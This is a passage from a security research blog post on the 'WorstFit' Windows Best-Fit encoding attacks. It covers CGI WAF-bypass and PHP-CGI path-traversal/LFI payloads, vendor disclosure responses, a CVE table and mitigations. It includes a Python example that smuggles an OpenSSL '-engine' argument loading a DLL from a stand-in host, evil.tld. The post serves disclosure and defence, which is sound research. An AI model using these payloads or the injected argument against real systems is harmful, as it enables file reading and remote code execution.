&lt;p&gt;For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.&lt;/p&gt;

&lt;p&gt;A common example is in &lt;strong&gt;CGI (Common Gateway Interface)&lt;/strong&gt;, where much of the HTTP request information—such as query strings, HTTP headers, and more—is passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---waf-bypass&quot;&gt;➤ Case study 1 - WAF bypass&lt;/h4&gt;

&lt;p&gt;In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/admin&lt;/code&gt; from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;/var/www/cgi-bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;%{REQUEST_URI} =~ m#/admin#&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, due to the &lt;strong&gt;WorstFit vulnerability&lt;/strong&gt; in Perl on Windows, this rule can be bypassed by substituting characters in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; with their &lt;strong&gt;Best-Fit equivalents&lt;/strong&gt;. For instance, in &lt;strong&gt;Code Page 1250&lt;/strong&gt;, the character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;à&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00E0&lt;/code&gt;) is converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; during the ANSI conversion.&lt;/p&gt;

&lt;p&gt;By crafting a URL like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/%E0dmin&lt;/code&gt;, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl’s CGI script retrieves the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; environment variable with ANSI API, and processes it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; after the Best-Fit conversion.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-2---php-cgi-local-file-inclusion-lfi&quot;&gt;➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)&lt;/h4&gt;

&lt;p&gt;The previous example was hypothetical, but here’s a real-world case we discovered. In &lt;strong&gt;PHP-CGI on Windows&lt;/strong&gt;, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.&lt;/p&gt;

&lt;p&gt;The root cause lies in how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; — and other path-related environment variables — are handled. Let’s break it down:&lt;/p&gt;

&lt;p&gt;Imagine a request URI like this:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/foo/bar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;REDIRECT_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;REQUEST_URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_TRANSLATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ndex.php&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;oo&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how the PHP script filename (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the additional path (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo/bar&lt;/code&gt;) are combined. From the environment variables alone, it’s unclear which part represents the PHP file and which is additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. Resolving this ambiguity is left to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;. Hmm, it must be quite easy to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; confused right?&lt;/p&gt;

&lt;p&gt;The first thought might be to try something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/../../../secret.txt&lt;/code&gt;. But this apparently won’t work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this?&lt;/p&gt;

&lt;p&gt;As we knew in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt;) in the Japanese code page can be exploited. For example, by sending a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥windows/win.ini/foo&lt;/code&gt;, you can potentially access arbitrary files. Here’s how it works:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Web Server’s Perspective&lt;/strong&gt;: The server treats the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¥..¥windows/win.ini/foo&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and processes it as part of the request.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;PHP-CGI’s Perspective&lt;/strong&gt;: PHP-CGI receives things like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REQUEST_URI=/index.php/..\..\windows/win.ini/foo&lt;/code&gt; and struggles to differentiate between the actual PHP file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web server’s behavior and configuration, this can turn into a file existence oracle on &lt;strong&gt;Apache&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Non-existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥NONEXIST/&lt;/code&gt;, PHP-CGI treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¥..¥NONEXIST/&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and renders &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php&lt;/code&gt; as usual.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥windows/win.ini/&lt;/code&gt;, PHP-CGI fails and produces a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No input file specified&lt;/code&gt; error due to how it handles valid files internally.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But why stop at just checking file existence? On an &lt;strong&gt;IIS server&lt;/strong&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doc_root&lt;/code&gt; directive configured, this can lead to &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;. Using a path like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥..¥windows/win.ini/&lt;/code&gt;, you can effectively include and read arbitrary files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As an LFI vulnerability, this can surely escalate to a potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; in scenarios where the included file contains executable or user-controllable code.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk–or Dawn–of the WorstFit&lt;/h2&gt;

&lt;p&gt;As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and this section highlights some obstacles we encountered during the reporting process.&lt;/p&gt;

&lt;h4 id=&quot;-is-this-an-issue&quot;&gt;🧐 &lt;strong&gt;Is this an issue?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;This was the most common question raised by vendors. Those in opposition argued that “passing user inputs to the command line in itself is already a vulnerability”. Even they are properly escaped or have sanitization in place, the root of the problem is still that “developers should avoid such practices altogether”.&lt;/p&gt;

&lt;p&gt;I am not sure if it’s fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.&lt;/p&gt;

&lt;h4 id=&quot;-who-is-responsible-for-that&quot;&gt;🧐 &lt;strong&gt;Who is responsible for that?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code is embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;“the developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;”&lt;/strong&gt;, or is it &lt;strong&gt;“CRT’s failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;”&lt;/strong&gt;?&lt;/p&gt;

&lt;p&gt;To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of &lt;a href=&quot;https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors&quot;&gt;compiler-introduced security vulnerabilities&lt;/a&gt;? 😉&lt;/p&gt;

&lt;h4 id=&quot;-its-really-hard-to-fix-it&quot;&gt;😖 &lt;strong&gt;It’s really hard to fix it!&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;I believe most maintainers would be willing to help with a quick fix, even if it wasn’t categorized as a security issue. However, resolving this problem isn’t that as simple as just replacing the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;&lt;/strong&gt; with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wchar_t *&lt;/code&gt;&lt;/strong&gt;. This process can be painful and error-prone. 😵‍💫&lt;/p&gt;

&lt;p&gt;We have also summarized some responses we received as follows:&lt;/p&gt;

&lt;h4 id=&quot;-curl&quot;&gt;➤ Curl&lt;/h4&gt;

&lt;p&gt;Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoft’s &lt;a href=&quot;https://curl.se/windows/microsoft.html&quot;&gt;ported Curl&lt;/a&gt; has properly modified the entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt; on the contrary, so the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl.exe&lt;/code&gt; on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.&lt;/p&gt;

&lt;p&gt;Here are some responses from Curl. You can check the full report on &lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;HackerOne&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I’m struggling to see how this is a curl problem. It looks like a Windows “feature” to me. It is being “helpful” and helps users to convert ascii-looking double quotes to ASCII double quotes.&lt;/p&gt;

  &lt;p&gt;— 👤 Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.&lt;/p&gt;

  &lt;p&gt;— 👤 Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-openssl&quot;&gt;➤ OpenSSL&lt;/h4&gt;

&lt;p&gt;This is an interesting case. OpenSSL provides an environment variable, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPENSSL_WIN32_UTF8&lt;/code&gt;, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally!&lt;/p&gt;

&lt;p&gt;However, most developers are still unaware of the need to set this environment variable while using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt; executable. As a result,it is still possible to leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-engine&lt;/code&gt; argument to execute arbitrary code in a default OpenSSL usage.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pass&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-engine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;evil.tld&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;malicious.dll&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;openssl.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;enc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-aes-256-cbc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-in&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;out.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-k&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-perl&quot;&gt;➤ Perl&lt;/h4&gt;

&lt;p&gt;The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as &lt;a href=&quot;https://strawberryperl.com/&quot;&gt;Strawberry Perl&lt;/a&gt; or &lt;a href=&quot;https://www.activestate.com/products/perl/&quot;&gt;ActiveState Perl&lt;/a&gt; are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that &lt;strong&gt;“This seems more like a Microsoft bug than a Perl bug,”&lt;/strong&gt; so this issue remains unresolved in Perl for now.&lt;/p&gt;

&lt;h4 id=&quot;-microsoft&quot;&gt;➤ Microsoft&lt;/h4&gt;

&lt;p&gt;We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(&lt;/p&gt;

&lt;p&gt;Here is the reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.
— 👤 MSRC&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-report-to-certcc&quot;&gt;➤ Report to CERT/CC&lt;/h4&gt;

&lt;p&gt;Since this is a systemic problem, we have also sought assistance from CERT/CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks&quot;&gt;warning&lt;/a&gt; in their documentation after several months of effort. However, they only put this warning in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. There are still several ANSI APIs that need attention! ¯\_(ツ)_/¯&lt;/p&gt;

&lt;p&gt;During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Report Date&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vendor&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Status&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/05/07&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;CVE-2024-4577&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Curl - &lt;a href=&quot;https://curl.se/windows/&quot;&gt;Official Build&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;Won’t Fix&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/cve-2024-45720&quot;&gt;CVE-2024-45720&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/16&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Tar - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Excel - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;excel.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft PhoneBook - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rasphone.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/07/15&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-8067&quot;&gt;CVE-2024-8067&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/05&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PostgreSQL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psql.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/08&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Putty - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plink.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fixed&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Other&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;wkhtmltopdf - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wkhtmltopdf.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;EOL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;

&lt;p&gt;So far, we have summarized attacks on WorstFit, including &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;↓ Table of Affected Code Pages:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;↓ World Map of WorstFit:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h3&gt;

&lt;p&gt;As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear — until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a user&lt;/strong&gt;, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, it’s uncertain whether it will cause side effects or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windows’ commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegQueryValueA&lt;/code&gt; are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! 😉&lt;/p&gt;

&lt;p&gt;We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!&lt;/p&gt;

</description>
